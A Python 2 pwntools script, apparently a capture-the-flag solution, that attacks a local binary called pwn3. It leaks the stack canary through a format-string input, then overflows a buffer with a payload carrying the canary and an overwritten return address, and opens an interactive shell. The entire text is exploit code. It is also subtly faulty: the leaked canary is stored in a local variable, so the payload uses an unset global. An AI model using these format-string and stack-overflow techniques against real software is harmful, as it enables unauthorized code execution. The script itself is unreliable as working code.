from  pwn import *
context(arch = 'amd64',os='linux')
#context.log_level='debug'
canary = ""
p = process('./pwn3')
def canary_leak():
	p.recvuntil('Exploit this binary and get shell :)\n')
	p.sendline('2')
	p.recvuntil('Read Menu.\n')
	p.sendline('%36$llx')
	p.sendline('1')
	p.recvuntil('Write Menu.\n')
	canary = p.recv(16)
	print "canary : " + canary
	canary = int(canary,16)
	canary += 1

if __name__ == '__main__':
	canary_leak()
	system_addr = 0x4006b6
	payload = "A"*0x68
	payload += p64(canary)
	payload += "A"*8
	payload += p64(system_addr)
	p.sendline('2')
	p.recvuntil('Read Menu.\n')

	p.sendline(payload)

	p.interactive()